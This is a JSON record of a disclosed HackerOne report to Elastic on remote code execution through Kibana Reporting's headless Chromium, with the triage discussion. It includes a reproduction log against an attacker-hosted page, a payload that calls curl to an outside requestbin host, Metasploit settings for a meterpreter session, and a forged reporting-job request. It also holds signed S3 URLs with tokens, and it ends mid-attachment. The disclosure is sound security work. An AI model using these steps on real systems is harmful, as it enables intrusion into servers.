@@ -1,0 +1,538 @@
+{
+  "id": 1168765,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTY4NzY1",
+  "url": "https://hackerone.com/reports/1168765",
+  "title": "RCE hazard in reporting (via Chromium)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2021-04-19T16:26:55.002Z",
+  "submitted_at": "2021-04-19T16:26:55.228Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "alexbrasetvik",
+    "url": "/alexbrasetvik",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/AMYBseEiuZm6mtG4rfyRgTBu/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23607,
+    "url": "https://hackerone.com/elastic",
+    "handle": "elastic",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/607/c5cce6a2e2d95af85e014db95c2d7560e73e9bec_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/607/c5cce6a2e2d95af85e014db95c2d7560e73e9bec_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Elastic",
+      "twitter_handle": "elastic",
+      "website": "https://www.elastic.co/",
+      "about": "Search, solve, and succeed with one platform, three search-powered solutions, built on a single technology stack"
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-05-26T14:52:25.723Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-05-26T07:27:15.244Z",
+  "team_member_agreed_on_going_public_at": "2021-05-26T14:52:25.533Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:** Reporting embeds a Chromium that is susceptible to RCEs\n\n**Description:**\n\nReporting uses a headless Chromium to generate PNGs and PDFs. This is invoked (at least on Elastic Cloud, ECE and ECK) with `--no-sandbox` to work at all.\n\nThere are RCEs readily available for Chrome, and at least the versions shipped with 7.11 and 7.12 are susceptible to the attached example.\n\nAttached is an adaptation of this exploit: https://github.com/rapid7/metasploit-framework/pull/15007/files#diff-42ae645fcacbd90d93296471ac57e1d734544af7fb082efd607db0a29d197ac4R53\n\nI have not been able to devise a complete chain yet (thus the \"hazard\"), but anything that enables pointing reporting at attacker-controlled JS would be able to pop an RCE this way. HTML-injection or XSS (even with the CSP a HTML injection will enable a redirect) or an open redirect would enable pointing reporting at custom JS code.\n\n## Steps To Reproduce:\n\n  1. Host the attached HTML somewhere, in my case it's available on http://192.168.0.154:8009/alexb-says-hi.html\n  1. Point the x-pack reporting-embedded Chromium at it (this step is missing to complete the chain)\n\nHere's an example. The attached HTML file gets `uname -a > /tmp/alexb-says-hi` to be run:\n\n```\n$ docker run --rm -it docker.elastic.co/kibana/kibana:7.12.0 bash  \nbash-4.4$ cd ./x-pack/plugins/reporting/chromium/headless_shell-linux_x64/\nbash-4.4$ ls /tmp/\nks-script-esd4my7v  ks-script-eusq_sc5\nbash-4.4$ ./headless_shell --no-sandbox http://192.168.0.154:8009/alexb-says-hi.html\n[0419/161441.709455:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale\n[0419/161441.725018:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale\n[0419/161441.727174:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale\n[0419/161441.821129:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale\n^C # CTRL-C after a few seconds. Reporting would kill it after a timeout\nbash-4.4$ ls /tmp/\nalexb-says-hi  ks-script-esd4my7v  ks-script-eusq_sc5\nbash-4.4$ cat /tmp/alexb-says-hi\nLinux bd1b285e33b7 4.19.121-linuxkit #1 SMP Thu Jan 21 15:36:34 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux\n```\n\n## Supporting Material/References:\n\n  * HTML-file which when accessed via Reporting's headless Chromium triggers an RCE. (Steps to produce that file via msfconsole is embedded in the HTML file as comments)\n\n## Impact\n\nKibana is an HTML-injection (even without full-blown XSS) or an open redirect away from being RCE-able via Reporting.",
+  "bounty_amount": "10000.0",
+  "formatted_bounty": "$10,000",
+  "weakness": {
+    "id": 75,
+    "name": "Privilege Escalation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1271128,
+      "file_name": "alexb-says-hi.html",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/9jggp66383oqd08vr4akgumljjjz?response-content-disposition=attachment%3B%20filename%3D%22alexb-says-hi.html%22%3B%20filename%2A%3DUTF-8%27%27alexb-says-hi.html&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSJ65FZXU%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071247Z&X-Amz-Expires=1806&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJIMEYCIQC13hGRnFPG%2F8PgGnjUyc6RI7lGqUkEmr5u8l5tIeU95QIhAJgg%2FXv6bUcqZ%2FSQC3RBLq7QXM%2FDN5dN3fmku2DEJLRYKrEFCCIQAxoMMDEzNjE5Mjc0ODQ5IgwwR6BVchZWZB1Ys8gqjgXWndmoLAPy6R6rOiASV6IYlCP1ezRaoIE9cgpZaMh%2BiDDyY22Id0kBwojlWW5TCy0oa17lVogIDNmlFMqIVN%2B2ieEOvRZB5BfofcdU4BRMQZobwebNU8U1u3z41pIbGrJ8z%2BD0M%2Bc3SExuepKl5kYwdxZUR3hRtqNEHS3wi9wFG1K55iEbkL8Z3%2FoeDgRA22vZLRT5%2Bfi8q5HN8wvWzeykQCs0lZ6PGAtuDC4GQ5dWmIVTVMNHx%2BHghUQIkfRiOCKLPdo1raL2z7hgrjkg9uzJ4JgHmVEXG%2BfUy7TYArAV%2FtaI4Vuk84onY9eYDjkRB4zCzNIDQEo2kQwFwon6IGIlWBgkVOO37ud5VNRp8NAt6xYzLVfR4qqbMVMnI%2BosvqIcAHiFOzs3eIqnCwzxnzOIqBtb9nvaev20H7dwAwrDoZoC2%2F9wqlTsldSl5EG76v8wCqYamXzWGsuilXt7wv8WwkAk9T553W2a%2B%2BfbsOgcFxSDDddQthDfGf74LDgvOb2WozDHRrLqsR6nJI76RIWLp1hA7eMvpy0gbrQPL19HvpjW9v9tulbIvFTeLguNOKjDBVTAfnJlwD5bISU0b3yinZhtA5cY6tmAv6r7GmVpVWrt66HzOIXW%2FhVM%2F%2B5a%2FR0ODLBMT569ATPEQNgL4OHbeE3fIWxzKiYS9vkDpQz2rAIST4aZTgwC253Ne3n%2FQrG%2B%2F%2B6UQZToMCs8RqF8WRXxfqW7abs4O3ZdrFKESqBFCpPJqUmgXkC67%2BQe35GJARmHz3%2FPH8lntEuX7Bf05Bji8vQCcT1mKCa2fcjqum%2B4rPEDglldLO90UMUUpktIwyKeG4i28osTzPFt1bAltrxqk8wrGuHdPtH7UPAddVEws%2Fm4qAY6sAHJcQAAHMEwHyUT%2B5pz47K2QtFkvJobeZlnKje2WF01wKCRmG2EyJnjOuCSI1K1aNlscisHQeA%2BSqBbWlLVKvLfdeB5Crp92OpeBOmAr1E13T72GcQLOwgGuTXFm8usje4Kh0GfIMl9shrEXw%2FQ1KpNchynhcV7QXLnKks3QIlRuBPhV8TVc9%2Fc7lZvke2E%2BkbhPQTqoPojsquSawR0K1xO9a99vuPUGcyN7Vkh00vEhA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=55474fbcc1d20b9e54fc96e3759cc0eac3fae86ce4e2e57ef9c4c06f2c5d0133",
+      "file_size": 30557,
+      "type": "text/html",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2021-06-25T07:27:15.345Z",
+  "allow_singular_disclosure_after": -70847131.69030955,
+  "singular_disclosure_allowed": true,
+  "vote_count": 15,
+  "voters": [
+    "alexbrasetvik",
+    "viridian_40826d",
+    "n1m0",
+    "haxor31337",
+    "dee-see",
+    "m0chan",
+    "rzx007x",
+    "jon_bottarini",
+    "aryan2808",
+    "superman85",
+    "and 5 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 438736,
+    "asset_type": "DOWNLOADABLE_EXECUTABLES",
+    "asset_identifier": "Kibana",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 11441830,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I didn't click any of the \"Severity (Optional)\" things, intending to leave them unchecked. I missed the default being High, which it probably isn't without a first step to form a chain.\n\nAs I mention, this isn't a complete chain. If mixed with an HTML-injection (even without an XSS) or an open redirect (or a full-blown XSS), it'd be an RCE on Cloud and Kibana, though.",
+      "automated_response": false,
+      "created_at": "2021-04-19T16:30:21.163Z",
+      "updated_at": "2021-04-19T16:30:21.163Z",
+      "actor": {
+        "username": "alexbrasetvik",
+        "cleared": false,
+        "verified": false,
+        "url": "/alexbrasetvik",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/AMYBseEiuZm6mtG4rfyRgTBu/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "elastic"
+    },
+    {
+      "id": 11457179,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "So I managed to do an RCE on Elastic Cloud. Attached is a video demonstrating it, and the HTML payload used in the video, which triggers `curl -k https://enu8lspgwcj2k.x.pipedream.net/?hifromelasticcloud`\n\nTo access the viewer of the requestbin (because editing the payload is a bit onerous), you can access it via https://requestbin.com/r/enu8lspgwcj2k/1rRl9tN9tAMRN6muMXXQB4jjxdZ (I don't know how long that is valid for)\n\nTo point reporting's vulnerable chromium at a page that triggered the exploiting Javascript, I, uh, configured kibana.yml to just always respond with a Location header. Then, I pointed reporting at a `/goto` URL, which emits the right redirect header and status code, but with my custom redirect overriding whatever the goto was trying to send the user to. This gets me a vulnerable Chromium to run my payload, which in turn triggers the curl request shown in the video.\n\nThe kibana involved is https://0e193a35efd34736940bc3e00386aed8.us-west1.gcp.cloud.es.io:9243, and I'm sure you have execve logs that can confirm these curls :)\n\n",
+      "automated_response": false,
+      "created_at": "2021-04-20T19:35:54.755Z",
+      "updated_at": "2021-04-20T19:35:54.755Z",
+      "actor": {
+        "username": "alexbrasetvik",
+        "cleared": false,
+        "verified": false,
+        "url": "/alexbrasetvik",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/AMYBseEiuZm6mtG4rfyRgTBu/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "attachments": [
+        {
+          "id": 1272699,
+          "filename": "curl-only.html",
+          "type": "text/html",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/i01r767lv4yrgghs58l9wi61dqqy?response-content-disposition=attachment%3B%20filename%3D%22curl-only.html%22%3B%20filename%2A%3DUTF-8%27%27curl-only.html&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSJ65FZXU%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071247Z&X-Amz-Expires=1806&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJIMEYCIQC13hGRnFPG%2F8PgGnjUyc6RI7lGqUkEmr5u8l5tIeU95QIhAJgg%2FXv6bUcqZ%2FSQC3RBLq7QXM%2FDN5dN3fmku2DEJLRYKrEFCCIQAxoMMDEzNjE5Mjc0ODQ5IgwwR6BVchZWZB1Ys8gqjgXWndmoLAPy6R6rOiASV6IYlCP1ezRaoIE9cgpZaMh%2BiDDyY22Id0kBwojlWW5TCy0oa17lVogIDNmlFMqIVN%2B2ieEOvRZB5BfofcdU4BRMQZobwebNU8U1u3z41pIbGrJ8z%2BD0M%2Bc3SExuepKl5kYwdxZUR3hRtqNEHS3wi9wFG1K55iEbkL8Z3%2FoeDgRA22vZLRT5%2Bfi8q5HN8wvWzeykQCs0lZ6PGAtuDC4GQ5dWmIVTVMNHx%2BHghUQIkfRiOCKLPdo1raL2z7hgrjkg9uzJ4JgHmVEXG%2BfUy7TYArAV%2FtaI4Vuk84onY9eYDjkRB4zCzNIDQEo2kQwFwon6IGIlWBgkVOO37ud5VNRp8NAt6xYzLVfR4qqbMVMnI%2BosvqIcAHiFOzs3eIqnCwzxnzOIqBtb9nvaev20H7dwAwrDoZoC2%2F9wqlTsldSl5EG76v8wCqYamXzWGsuilXt7wv8WwkAk9T553W2a%2B%2BfbsOgcFxSDDddQthDfGf74LDgvOb2WozDHRrLqsR6nJI76RIWLp1hA7eMvpy0gbrQPL19HvpjW9v9tulbIvFTeLguNOKjDBVTAfnJlwD5bISU0b3yinZhtA5cY6tmAv6r7GmVpVWrt66HzOIXW%2FhVM%2F%2B5a%2FR0ODLBMT569ATPEQNgL4OHbeE3fIWxzKiYS9vkDpQz2rAIST4aZTgwC253Ne3n%2FQrG%2B%2F%2B6UQZToMCs8RqF8WRXxfqW7abs4O3ZdrFKESqBFCpPJqUmgXkC67%2BQe35GJARmHz3%2FPH8lntEuX7Bf05Bji8vQCcT1mKCa2fcjqum%2B4rPEDglldLO90UMUUpktIwyKeG4i28osTzPFt1bAltrxqk8wrGuHdPtH7UPAddVEws%2Fm4qAY6sAHJcQAAHMEwHyUT%2B5pz47K2QtFkvJobeZlnKje2WF01wKCRmG2EyJnjOuCSI1K1aNlscisHQeA%2BSqBbWlLVKvLfdeB5Crp92OpeBOmAr1E13T72GcQLOwgGuTXFm8usje4Kh0GfIMl9shrEXw%2FQ1KpNchynhcV7QXLnKks3QIlRuBPhV8TVc9%2Fc7lZvke2E%2BkbhPQTqoPojsquSawR0K1xO9a99vuPUGcyN7Vkh00vEhA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1a96bef91aa5decd8a882ca8716230a7d962b89db55790660f35d34c31fb77e5"
+        },
+        {
+          "id": 1272698,
+          "filename": "rce-via-reporting-chromium.mov",
+          "type": "video/quicktime",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/w915a5oy3oxibqfcwtkfbfooo1c5?response-content-disposition=attachment%3B%20filename%3D%22rce-via-reporting-chromium.mov%22%3B%20filename%2A%3DUTF-8%27%27rce-via-reporting-chromium.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSJ65FZXU%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071247Z&X-Amz-Expires=1806&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJIMEYCIQC13hGRnFPG%2F8PgGnjUyc6RI7lGqUkEmr5u8l5tIeU95QIhAJgg%2FXv6bUcqZ%2FSQC3RBLq7QXM%2FDN5dN3fmku2DEJLRYKrEFCCIQAxoMMDEzNjE5Mjc0ODQ5IgwwR6BVchZWZB1Ys8gqjgXWndmoLAPy6R6rOiASV6IYlCP1ezRaoIE9cgpZaMh%2BiDDyY22Id0kBwojlWW5TCy0oa17lVogIDNmlFMqIVN%2B2ieEOvRZB5BfofcdU4BRMQZobwebNU8U1u3z41pIbGrJ8z%2BD0M%2Bc3SExuepKl5kYwdxZUR3hRtqNEHS3wi9wFG1K55iEbkL8Z3%2FoeDgRA22vZLRT5%2Bfi8q5HN8wvWzeykQCs0lZ6PGAtuDC4GQ5dWmIVTVMNHx%2BHghUQIkfRiOCKLPdo1raL2z7hgrjkg9uzJ4JgHmVEXG%2BfUy7TYArAV%2FtaI4Vuk84onY9eYDjkRB4zCzNIDQEo2kQwFwon6IGIlWBgkVOO37ud5VNRp8NAt6xYzLVfR4qqbMVMnI%2BosvqIcAHiFOzs3eIqnCwzxnzOIqBtb9nvaev20H7dwAwrDoZoC2%2F9wqlTsldSl5EG76v8wCqYamXzWGsuilXt7wv8WwkAk9T553W2a%2B%2BfbsOgcFxSDDddQthDfGf74LDgvOb2WozDHRrLqsR6nJI76RIWLp1hA7eMvpy0gbrQPL19HvpjW9v9tulbIvFTeLguNOKjDBVTAfnJlwD5bISU0b3yinZhtA5cY6tmAv6r7GmVpVWrt66HzOIXW%2FhVM%2F%2B5a%2FR0ODLBMT569ATPEQNgL4OHbeE3fIWxzKiYS9vkDpQz2rAIST4aZTgwC253Ne3n%2FQrG%2B%2F%2B6UQZToMCs8RqF8WRXxfqW7abs4O3ZdrFKESqBFCpPJqUmgXkC67%2BQe35GJARmHz3%2FPH8lntEuX7Bf05Bji8vQCcT1mKCa2fcjqum%2B4rPEDglldLO90UMUUpktIwyKeG4i28osTzPFt1bAltrxqk8wrGuHdPtH7UPAddVEws%2Fm4qAY6sAHJcQAAHMEwHyUT%2B5pz47K2QtFkvJobeZlnKje2WF01wKCRmG2EyJnjOuCSI1K1aNlscisHQeA%2BSqBbWlLVKvLfdeB5Crp92OpeBOmAr1E13T72GcQLOwgGuTXFm8usje4Kh0GfIMl9shrEXw%2FQ1KpNchynhcV7QXLnKks3QIlRuBPhV8TVc9%2Fc7lZvke2E%2BkbhPQTqoPojsquSawR0K1xO9a99vuPUGcyN7Vkh00vEhA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=86b0be8e8b1059c260472a3d605f8dd5e99b30bce424219deaba5b4c57c613b0"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "elastic"
+    },
+    {
+      "id": 11457778,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Nice Alex!\n\nI'll start looking into this - though as a heads up, I am out tomorrow and so may not get this triaged and get your money to you until Thursday.\n\nLooking forward to reading into this :) ",
+      "automated_response": false,
+      "created_at": "2021-04-20T21:08:35.541Z",
+      "updated_at": "2021-04-20T21:08:35.541Z",
+      "actor": {
+        "username": "douglas_day",
+        "cleared": false,
+        "verified": false,
+        "url": "/douglas_day",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/1ALNLRqrFXt23SDSBvAqPZAH/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "elastic"
+    },
+    {
+      "id": 11463608,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNeedsMoreInfo",
+      "message": "Hi @alexbrasetvik,\n\nThanks for your report. I'm having difficulties reproducing the described behavior. Apparently, the file is correctly fetched according to my ngrok logs, but no code execution occurs:\n\n{F1273303}\n\nI assume the payload used is strictly dependent on the host machine architecture/version. Can you please leave additional information on the OS version running the Docker service?\n\nRegarding the severity, the `--no-sandbox` argument is actually a poor security practice and it's generally not recommended running the headless instance with that flag. As such, this somehow mitigates the attack as the victim must intentionally launch the command with such a flag.\n\nBest,\n@lugtag ",
+      "automated_response": false,
+      "created_at": "2021-04-21T10:19:31.993Z",
+      "updated_at": "2021-04-21T10:19:31.993Z",
+      "actor": {
+        "username": "h1_analyst_jake",
+        "cleared": false,
+        "verified": false,
+        "url": "/h1_analyst_jake",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/gKtXsNkprE7ekgjBwpwWpTzX/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": true,
+        "hackerone_employee": false
+      },
+      "attachments": [
+        {
+          "id": 1273303,
+          "filename": "Screenshot_2021-04-21_at_12.13.29.png",
+          "type": "image/png",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/3gtgkr3eg0nadm6602uu3jt7gyma?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2021-04-21_at_12.13.29.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2021-04-21_at_12.13.29.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSJ65FZXU%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071247Z&X-Amz-Expires=1806&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJIMEYCIQC13hGRnFPG%2F8PgGnjUyc6RI7lGqUkEmr5u8l5tIeU95QIhAJgg%2FXv6bUcqZ%2FSQC3RBLq7QXM%2FDN5dN3fmku2DEJLRYKrEFCCIQAxoMMDEzNjE5Mjc0ODQ5IgwwR6BVchZWZB1Ys8gqjgXWndmoLAPy6R6rOiASV6IYlCP1ezRaoIE9cgpZaMh%2BiDDyY22Id0kBwojlWW5TCy0oa17lVogIDNmlFMqIVN%2B2ieEOvRZB5BfofcdU4BRMQZobwebNU8U1u3z41pIbGrJ8z%2BD0M%2Bc3SExuepKl5kYwdxZUR3hRtqNEHS3wi9wFG1K55iEbkL8Z3%2FoeDgRA22vZLRT5%2Bfi8q5HN8wvWzeykQCs0lZ6PGAtuDC4GQ5dWmIVTVMNHx%2BHghUQIkfRiOCKLPdo1raL2z7hgrjkg9uzJ4JgHmVEXG%2BfUy7TYArAV%2FtaI4Vuk84onY9eYDjkRB4zCzNIDQEo2kQwFwon6IGIlWBgkVOO37ud5VNRp8NAt6xYzLVfR4qqbMVMnI%2BosvqIcAHiFOzs3eIqnCwzxnzOIqBtb9nvaev20H7dwAwrDoZoC2%2F9wqlTsldSl5EG76v8wCqYamXzWGsuilXt7wv8WwkAk9T553W2a%2B%2BfbsOgcFxSDDddQthDfGf74LDgvOb2WozDHRrLqsR6nJI76RIWLp1hA7eMvpy0gbrQPL19HvpjW9v9tulbIvFTeLguNOKjDBVTAfnJlwD5bISU0b3yinZhtA5cY6tmAv6r7GmVpVWrt66HzOIXW%2FhVM%2F%2B5a%2FR0ODLBMT569ATPEQNgL4OHbeE3fIWxzKiYS9vkDpQz2rAIST4aZTgwC253Ne3n%2FQrG%2B%2F%2B6UQZToMCs8RqF8WRXxfqW7abs4O3ZdrFKESqBFCpPJqUmgXkC67%2BQe35GJARmHz3%2FPH8lntEuX7Bf05Bji8vQCcT1mKCa2fcjqum%2B4rPEDglldLO90UMUUpktIwyKeG4i28osTzPFt1bAltrxqk8wrGuHdPtH7UPAddVEws%2Fm4qAY6sAHJcQAAHMEwHyUT%2B5pz47K2QtFkvJobeZlnKje2WF01wKCRmG2EyJnjOuCSI1K1aNlscisHQeA%2BSqBbWlLVKvLfdeB5Crp92OpeBOmAr1E13T72GcQLOwgGuTXFm8usje4Kh0GfIMl9shrEXw%2FQ1KpNchynhcV7QXLnKks3QIlRuBPhV8TVc9%2Fc7lZvke2E%2BkbhPQTqoPojsquSawR0K1xO9a99vuPUGcyN7Vkh00vEhA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0c6934e30a840b1440e6de271f79125924e2d37932ab2c0df907a74eeda142a5"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "elastic"
+    },
+    {
+      "id": 11465879,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNew",
+      "message": "@lugtag ngrok ngrok tunnels are ephemeral, and you pointed it at something that probably just returned a 404. The first message with the `alexb-says-hi.html` attachment should be usable. Put that wherever and point headless_shell at it. (`python -m SimpleHTTPServer 8000` will serve your cwd on port 8000)\n\nI'm running Docker for Mac like you are. \n\n>  the `--no-sandbox` argument is actually a poor security practice and it's generally not recommended running the headless instance with that flag.\n\nI would agree. ECE and Elastic Cloud does run Kibana with the sandbox disabled, though, thus the hazard (and RCE on Elastic Cloud) - https://github.com/elastic/kibana/blob/master/x-pack/plugins/reporting/server/browsers/chromium/driver_factory/args.ts#L58-L60\n\n",
+      "automated_response": false,
+      "created_at": "2021-04-21T12:55:10.531Z",
+      "updated_at": "2021-04-21T12:55:10.531Z",
+      "actor": {
+        "username": "alexbrasetvik",
+        "cleared": false,
+        "verified": false,
+        "url": "/alexbrasetvik",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/AMYBseEiuZm6mtG4rfyRgTBu/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "elastic"
+    },
+    {
+      "id": 11469986,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I made an updated recording that's maybe a bit easier to follow. I just spun up an ec2 instance and ran metasploit on it, and got a meterpreter session established in the Kibana container.\n\nMetasploit settings:\n```\nuse exploit/multi/browser/chrome_simplifiedlowering_overflow\nset target 0\nset payload 5\nset uripath /\nset lhost [your public ip]\n```\n\nCustom kibana.yml settings:\n```\nserver.customResponseHeaders:\n   Location: \"http://13.53.201.208:8080\"\n```\n\nCustom reporting create request:\n\n```\n# To get a valid auth header, just create a PDF of something and extract its header from here.\n# The header is valid for a few minutes, if you get \"security exception\" from reporting, then \n# you need to refresh your header\nGET /.reporting-2021-*/_search?sort=created_at:desc&size=1\n\nPOST /.reporting-2021-04-18/_doc\n{\n          \"jobtype\" : \"printable_pdf\",\n          \"created_at\" : \"2021-04-19T21:45:15.379Z\",\n          \"created_by\" : \"2\",\n          \"payload\" : {\n            \"headers\" : \"REPLACE ME - SEE COMMENT ABOVE\",\n            \"browserTimezone\" : \"Europe/Oslo\",\n            \"forceNow\" : \"2021-04-19T21:45:15.379Z\",\n            \"layout\" : {\n              \"dimensions\" : {\n                \"height\" : 1160,\n                \"width\" : 1780\n              },\n              \"id\" : \"preserve_layout\"\n            },\n            \"objects\" : [\n              {\n                \"relativeUrl\" : \"/goto/[MAKE A PROPER SHORT URL AND REPLACE ME]#/edit/windows-4bedf650-9ffd-11ea-87e4-49f31ec44891?_g=(filters:!(),refreshInterval:(pause:!t,value:0),time:(from:now-15m,to:now))&_a=(filters:!(('$state':(store:appState),meta:(alias:!n,disabled:!f,index:'logs-*',key:event.code,negate:!f,params:(query:'4625'),type:phrase),query:(match_phrase:(event.code:'4625'))),('$state':(store:appState),meta:(alias:!n,disabled:!f,index:'logs-*',key:winlog.provider_name,negate:!f,params:(query:Microsoft-Windows-Security-Auditing),type:phrase),query:(match_phrase:(winlog.provider_name:Microsoft-Windows-Security-Auditing)))),linked:!f,query:(language:kuery,query:'data_stream.dataset:windows.security%20OR%20data_stream.dataset:system.security'),uiState:(),vis:(aggs:!((enabled:!t,id:'1',params:(customLabel:'Failed%20Logons'),schema:metric,type:count)),params:(addLegend:!f,addTooltip:!t,metric:(colorSchema:'Green%20to%20Red',colorsRange:!((from:0,to:10000)),invertColors:!f,labels:(show:!t),metricColorMode:None,percentageMode:!f,style:(bgColor:!f,bgFill:%23000,fontSize:60,labelColor:!f,subText:''),useRanges:!f),type:metric),title:'%20Failed%20Logons%20%20%5BWindows%20System%20Security%5D',type:metric))\"\n              }\n            ],\n            \"title\" : \"goto?\",\n            \"objectType\" : \"visualization\"\n          },\n          \"meta\" : {\n            \"objectType\" : \"visualization\",\n            \"layout\" : \"preserve_layout\"\n          },\n          \"timeout\" : 100000,\n          \"max_attempts\" : 3,\n          \"priority\" : 10,\n          \"browser_type\" : \"chromium\",\n          \"status\" : \"pending\",\n          \"attempts\" : 0,\n          \"process_expiration\" : \"1970-01-01T00:00:00.000Z\"\n        }\n```",
+      "automated_response": false,
+      "created_at": "2021-04-21T16:44:42.131Z",
+      "updated_at": "2021-04-21T16:44:42.131Z",
+      "actor": {
+        "username": "alexbrasetvik",
+        "cleared": false,
+        "verified": false,
+        "url": "/alexbrasetvik",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/AMYBseEiuZm6mtG4rfyRgTBu/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "attachments": [
+        {
+          "id": 1273723,
+          "filename": "kibana-reporting-meterpreter.mov",
+          "type": "video/quicktime",
